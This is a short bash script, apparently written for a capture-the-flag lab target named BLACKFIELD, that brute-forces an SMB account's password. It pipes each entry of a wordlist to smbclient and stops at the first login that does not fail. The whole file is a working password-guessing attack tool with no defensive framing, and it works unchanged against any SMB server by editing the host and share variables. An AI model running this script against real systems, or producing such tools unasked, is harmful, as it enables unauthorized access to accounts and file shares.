#!/bin/bash
# author: dead1
# smb-bruteforce.sh
# quick script to bruteforce smb

# username file
username=support
userfile=top1k.txt
host=10.10.10.192
share=forensic
workgroup=BLACKFIELD

count=`wc -w ${userfile} | cut -d " " -f 1`

echo -e "[*] Dead1's SMB Bruteforcer"
echo -e "[*] Target Host:	${host}"
echo -e "[*] Target Username:	${username}"
echo -e "[*] Total Passwords:	${count}"
echo -e "[*] Trying Password:"
for u in `cat ${userfile}`;
do
	echo -ne "$u\r"
	string=`echo -e "${u}" | smbclient \\\\\\\\${host}\\\\${share} -U "${username}" -W ${workgroup} --socket-options="TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072" -t 40000`
	if [[ $string != *"LOGON_FAILURE"* ]]; then
  		echo -e "\n[*] VALID PASSWORD FOUND: ${u}"
		echo -e "[*] Done."
		exit
	fi
	echo -ne "                    \r"
done
echo -e "[*] Done."
